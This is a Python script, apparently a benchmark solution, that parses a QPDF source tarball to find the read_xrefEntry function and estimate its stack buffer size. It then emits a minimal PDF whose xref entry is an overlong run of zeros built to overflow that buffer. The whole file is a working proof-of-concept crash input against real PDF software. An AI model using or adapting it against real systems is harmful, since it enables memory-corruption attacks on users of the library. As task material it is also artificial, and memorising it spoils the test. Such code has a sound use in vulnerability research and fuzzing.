import os
import re
import tarfile
from typing import Optional, List


def _extract_function_body_cpp(code: str, needle_pos: int) -> Optional[str]:
    n = len(code)
    i = needle_pos
    brace_pos = code.find("{", i)
    if brace_pos < 0:
        return None

    depth = 0
    body_start = None

    in_line_comment = False
    in_block_comment = False
    in_dq = False
    in_sq = False
    escape = False

    i = brace_pos
    while i < n:
        c = code[i]
        nxt = code[i + 1] if i + 1 < n else ""

        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            i += 1
            continue

        if in_block_comment:
            if c == "*" and nxt == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue

        if in_dq:
            if escape:
                escape = False
            else:
                if c == "\\":
                    escape = True
                elif c == '"':
                    in_dq = False
            i += 1
            continue

        if in_sq:
            if escape:
                escape = False
            else:
                if c == "\\":
                    escape = True
                elif c == "'":
                    in_sq = False
            i += 1
            continue

        if c == "/" and nxt == "/":
            in_line_comment = True
            i += 2
            continue
        if c == "/" and nxt == "*":
            in_block_comment = True
            i += 2
            continue
        if c == '"':
            in_dq = True
            i += 1
            continue
        if c == "'":
            in_sq = True
            i += 1
            continue

        if c == "{":
            depth += 1
            if depth == 1:
                body_start = i + 1
        elif c == "}":
            depth -= 1
            if depth == 0 and body_start is not None:
                return code[body_start:i]

        i += 1

    return None


def _find_read_xrefentry_body_from_text(text: str) -> Optional[str]:
    patterns = [
        r"\bQPDF\s*::\s*read_xrefEntry\s*\(",
        r"\bread_xrefEntry\s*\(",
    ]
    for pat in patterns:
        for m in re.finditer(pat, text):
            body = _extract_function_body_cpp(text, m.start())
            if body and "xref" in body:
                return body
    for m in re.finditer(r"\bread_xrefEntry\s*\(", text):
        body = _extract_function_body_cpp(text, m.start())
        if body:
            return body
    return None


def _estimate_stack_buffer_size_from_body(body: str) -> Optional[int]:
    sizes: List[int] = []

    for m in re.finditer(r"\b(?:unsigned\s+char|signed\s+char|char)\s+\w+\s*\[\s*(\d+)\s*\]", body):
        try:
            sizes.append(int(m.group(1)))
        except Exception:
            pass

    for m in re.finditer(r"\bstd\s*::\s*array\s*<\s*char\s*,\s*(\d+)\s*>", body):
        try:
            sizes.append(int(m.group(1)))
        except Exception:
            pass

    if not sizes:
        return None

    candidates = [s for s in sizes if 8 <= s <= 8192]
    if not candidates:
        return None

    return max(candidates)


class Solution:
    def solve(self, src_path: str) -> bytes:
        k = 64

        try:
            if os.path.isfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    members = tf.getmembers()
                    preferred = []
                    others = []
                    for m in members:
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if not name.endswith((".cc", ".cpp", ".cxx", ".c", ".h", ".hh", ".hpp")):
                            continue
                        if m.size <= 0 or m.size > 3_000_000:
                            continue
                        if "qpdf" in name or "xref" in name:
                            preferred.append(m)
                        else:
                            others.append(m)

                    found_body = None
                    for m in preferred + others:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        if b"read_xrefEntry" not in data:
                            continue
                        text = data.decode("utf-8", "ignore")
                        body = _find_read_xrefentry_body_from_text(text)
                        if body:
                            found_body = body
                            break

                    if found_body:
                        buf_size = _estimate_stack_buffer_size_from_body(found_body)
                        if buf_size is not None:
                            k = max(32, buf_size + 32)
        except Exception:
            pass

        header = b"%PDF-1.0\n"
        xref = b"xref\n0 1\n"
        entry = (b"0" * max(21, k)) + b"\n"
        suffix = b"startxref\n9\n%%EOF\n"
        return header + xref + entry + suffix